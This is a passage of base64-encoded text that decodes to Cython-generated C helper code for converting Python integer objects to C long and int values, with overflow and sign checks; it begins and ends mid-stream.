DwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgLTQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBsb25nLCAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKCgoKGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgfQojZW5kaWYKICAgICAgICBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhsb25nLCBsb25nLCBQeUxvbmdfQXNMb25nKHgpKQojaWZkZWYgSEFWRV9MT05HX0xPTkcKICAgICAgICB9IGVsc2UgaWYgKChzaXplb2YobG9uZykgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhsb25nLCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc0xvbmdMb25nKHgpKQojZW5kaWYKICAgICAgICB9CiAgICB9CiAgICB7CiAgICAgICAgbG9uZyB2YWw7CiAgICAgICAgaW50IHJldCA9IC0xOwojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIFB5X3NzaXplX3QgYnl0ZXNfY29waWVkID0gUHlMb25nX0FzTmF0aXZlQnl0ZXMoCiAgICAgICAgICAgIHgsICZ2YWwsIHNpemVvZih2YWwpLCBQeV9BU05BVElWRUJZVEVTX05BVElWRV9FTkRJQU4gfCAoaXNfdW5zaWduZWQgPyBQeV9BU05BVElWRUJZVEVTX1VOU0lHTkVEX0JVRkZFUiB8IFB5X0FTTkFUSVZFQllURVNfUkVKRUNUX05FR0FUSVZFIDogMCkpOwogICAgICAgIGlmICh1bmxpa2VseShieXRlc19jb3BpZWQgPT0gLTEpKSB7CiAgICAgICAgfSBlbHNlIGlmICh1bmxpa2VseShieXRlc19jb3BpZWQgPiAoUHlfc3NpemVfdCkgc2l6ZW9mKHZhbCkpKSB7CiAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0ID0gMDsKICAgICAgICB9CiNlbGlmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMCAmJiAhKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSB8fCBkZWZpbmVkKF9QeUxvbmdfQXNCeXRlQXJyYXkpCiAgICAgICAgaW50IG9uZSA9IDE7IGludCBpc19saXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7CiAgICAgICAgdW5zaWduZWQgY2hhciAqYnl0ZXMgPSAodW5zaWduZWQgY2hhciAqKSZ2YWw7CiAgICAgICAgcmV0ID0gX1B5TG9uZ19Bc0J5dGVBcnJheSgoUHlMb25nT2JqZWN0ICopeCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZXMsIHNpemVvZih2YWwpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpc19saXR0bGUsICFpc191bnNpZ25lZCk7CiNlbHNlCiAgICAgICAgUHlPYmplY3QgKnY7CiAgICAgICAgUHlPYmplY3QgKnN0ZXB2YWwgPSBOVUxMLCAqbWFzayA9IE5VTEwsICpzaGlmdCA9IE5VTEw7CiAgICAgICAgaW50IGJpdHMsIHJlbWFpbmluZ19iaXRzLCBpc19uZWdhdGl2ZSA9IDA7CiAgICAgICAgaW50IGNodW5rX3NpemUgPSAoc2l6ZW9mKGxvbmcpIDwgOCkgPyAzMCA6IDYyOwogICAgICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3QoeCkpKSB7CiAgICAgICAgICAgIHYgPSBfX1B5eF9OZXdSZWYoeCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdiA9IFB5TnVtYmVyX0xvbmcoeCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdikpIHJldHVybiAobG9uZykgLTE7CiAgICAgICAgICAgIGFzc2VydChQeUxvbmdfQ2hlY2tFeGFjdCh2KSk7CiAgICAgICAgfQogICAgICAgIHsKICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh2LCBQeV9GYWxzZSwgUHlfTFQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih2KTsKICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaXNfbmVnYXRpdmUgPSByZXN1bHQgPT0gMTsKICAgICAgICB9CiAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KGlzX25lZ2F0aXZlKSkgewogICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0gZWxzZSBpZiAoaXNfbmVnYXRpdmUpIHsKICAgICAgICAgICAgc3RlcHZhbCA9IFB5TnVtYmVyX0ludmVydCh2KTsKICAgICAgICAgICAgUHlfREVDUkVGKHYpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXN0ZXB2YWwpKQogICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBzdGVwdmFsID0gdjsKICAgICAgICB9CiAgICAgICAgdiA9IE5VTEw7CiAgICAgICAgdmFsID0gKGxvbmcpIDA7CiAgICAgICAgbWFzayA9IFB5TG9uZ19Gcm9tTG9uZygoMUwgPDwgY2h1bmtfc2l6ZSkgLSAxKTsgaWYgKHVubGlrZWx5KCFtYXNrKSkgZ290byBkb25lOwogICAgICAgIHNoaWZ0ID0gUHlMb25nX0Zyb21Mb25nKGNodW5rX3NpemUpOyBpZiAodW5saWtlbHkoIXNoaWZ0KSkgZ290byBkb25lOwogICAgICAgIGZvciAoYml0cyA9IDA7IGJpdHMgPCAoaW50KSBzaXplb2YobG9uZykgKiA4IC0gY2h1bmtfc2l6ZTsgYml0cyArPSBjaHVua19zaXplKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICp0bXAsICpkaWdpdDsKICAgICAgICAgICAgbG9uZyBpZGlnaXQ7CiAgICAgICAgICAgIGRpZ2l0ID0gUHlOdW1iZXJfQW5kKHN0ZXB2YWwsIG1hc2spOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIWRpZ2l0KSkgZ290byBkb25lOwogICAgICAgICAgICBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKGRpZ2l0KTsKICAgICAgICAgICAgUHlfREVDUkVGKGRpZ2l0KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA8IDApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIHZhbCB8PSAoKGxvbmcpIGlkaWdpdCkgPDwgYml0czsKICAgICAgICAgICAgdG1wID0gUHlOdW1iZXJfUnNoaWZ0KHN0ZXB2YWwsIHNoaWZ0KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF0bXApKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIFB5X0RFQ1JFRihzdGVwdmFsKTsgc3RlcHZhbCA9IHRtcDsKICAgICAgICB9CiAgICAgICAgUHlfREVDUkVGKHNoaWZ0KTsgc2hpZnQgPSBOVUxMOwogICAgICAgIFB5X0RFQ1JFRihtYXNrKTsgbWFzayA9IE5VTEw7CiAgICAgICAgewogICAgICAgICAgICBsb25nIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoc3RlcHZhbCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPCAwKSkgZ290byBkb25lOwogICAgICAgICAgICByZW1haW5pbmdfYml0cyA9ICgoaW50KSBzaXplb2YobG9uZykgKiA4KSAtIGJpdHMgLSAoaXNfdW5zaWduZWQgPyAwIDogMSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPj0gKDFMIDw8IHJlbWFpbmluZ19iaXRzKSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93OwogICAgICAgICAgICB2YWwgfD0gKChsb25nKSBpZGlnaXQpIDw8IGJpdHM7CiAgICAgICAgfQogICAgICAgIGlmICghaXNfdW5zaWduZWQpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHZhbCAmICgoKGxvbmcpIDEpIDw8IChzaXplb2YobG9uZykgKiA4IC0gMSkpKSkKICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7CiAgICAgICAgICAgIGlmIChpc19uZWdhdGl2ZSkKICAgICAgICAgICAgICAgIHZhbCA9IH52YWw7CiAgICAgICAgfQogICAgICAgIHJldCA9IDA7CiAgICBkb25lOgogICAgICAgIFB5X1hERUNSRUYoc2hpZnQpOwogICAgICAgIFB5X1hERUNSRUYobWFzayk7CiAgICAgICAgUHlfWERFQ1JFRihzdGVwdmFsKTsKI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KHJldCkpCiAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7CiAgICAgICAgcmV0dXJuIHZhbDsKICAgIH0KcmFpc2Vfb3ZlcmZsb3c6CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwKICAgICAgICAidmFsdWUgdG9vIGxhcmdlIHRvIGNvbnZlcnQgdG8gbG9uZyIpOwogICAgcmV0dXJuIChsb25nKSAtMTsKcmFpc2VfbmVnX292ZXJmbG93OgogICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsCiAgICAgICAgImNhbid0IGNvbnZlcnQgbmVnYXRpdmUgdmFsdWUgdG8gbG9uZyIpOwogICAgcmV0dXJuIChsb25nKSAtMTsKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUxvbmdfQXNfaW50KFB5T2JqZWN0ICp4KSB7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwdXNoCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIgojZW5kaWYKICAgIGNvbnN0IGludCBuZWdfb25lID0gKGludCkgLTEsIGNvbnN0X3plcm8gPSAoaW50KSAwOwojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wCiNlbmRpZgogICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87CiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHsKICAgICAgICBpbnQgdmFsOwogICAgICAgIFB5T2JqZWN0ICp0bXAgPSBfX1B5eF9QeU51bWJlcl9Mb25nKHgpOwogICAgICAgIGlmICghdG1wKSByZXR1cm4gKGludCkgLTE7CiAgICAgICAgdmFsID0gX19QeXhfUHlMb25nX0FzX2ludCh0bXApOwogICAgICAgIFB5X0RFQ1JFRih0bXApOwogICAgICAgIHJldHVybiB2YWw7CiAgICB9CiAgICBpZiAoaXNfdW5zaWduZWQpIHsKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNOZWcoeCkpKSB7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIF9fUHl4X2NvbXBhY3RfdXB5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZVVuc2lnbmVkKHgpKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpOwogICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTsKICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSkgewogICAgICAgICAgICAgICAgY2FzZSAyOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihpbnQpID4gMSAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgPj0gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihpbnQpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSA+PSAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihpbnQpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpID49IDQgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgfQojZW5kaWYKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTcKICAgICAgICBpZiAodW5saWtlbHkoUHlfU0laRSh4KSA8IDApKSB7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0KI2Vsc2UKICAgICAgICB7CiAgICAgICAgICAgIGludCByZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woeCwgUHlfRmFsc2UsIFB5X0xUKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA8IDApKQogICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpIC0xOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0ID09IDEpKQogICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfQojZW5kaWYKICAgICAgICBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZih1bnNpZ25lZCBsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgdW5zaWduZWQgbG9uZywgUHlMb25nX0FzVW5zaWduZWRMb25nKHgpKQojaWZkZWYgSEFWRV9MT05HX0xPTkcKICAgICAgICB9IGVsc2UgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YodW5zaWduZWQgUFlfTE9OR19MT05HKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgdW5zaWduZWQgUFlfTE9OR19MT05HLCBQeUxvbmdfQXNVbnNpZ25lZExvbmdMb25nKHgpKQojZW5kaWYKICAgICAgICB9CiAgICB9IGVsc2UgewojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAgICAgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBfX1B5eF9jb21wYWN0X3B5bG9uZywgX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KSkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTsKICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7CiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkpIHsKICAgICAgICAgICAgICAgIGNhc2UgLTI6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMSAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgbG9uZywgLShsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKGludCktMSkqKCgoKChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgLTM6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgbG9uZywgLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoaW50KS0xKSooKCgoKCgoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgLTQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgI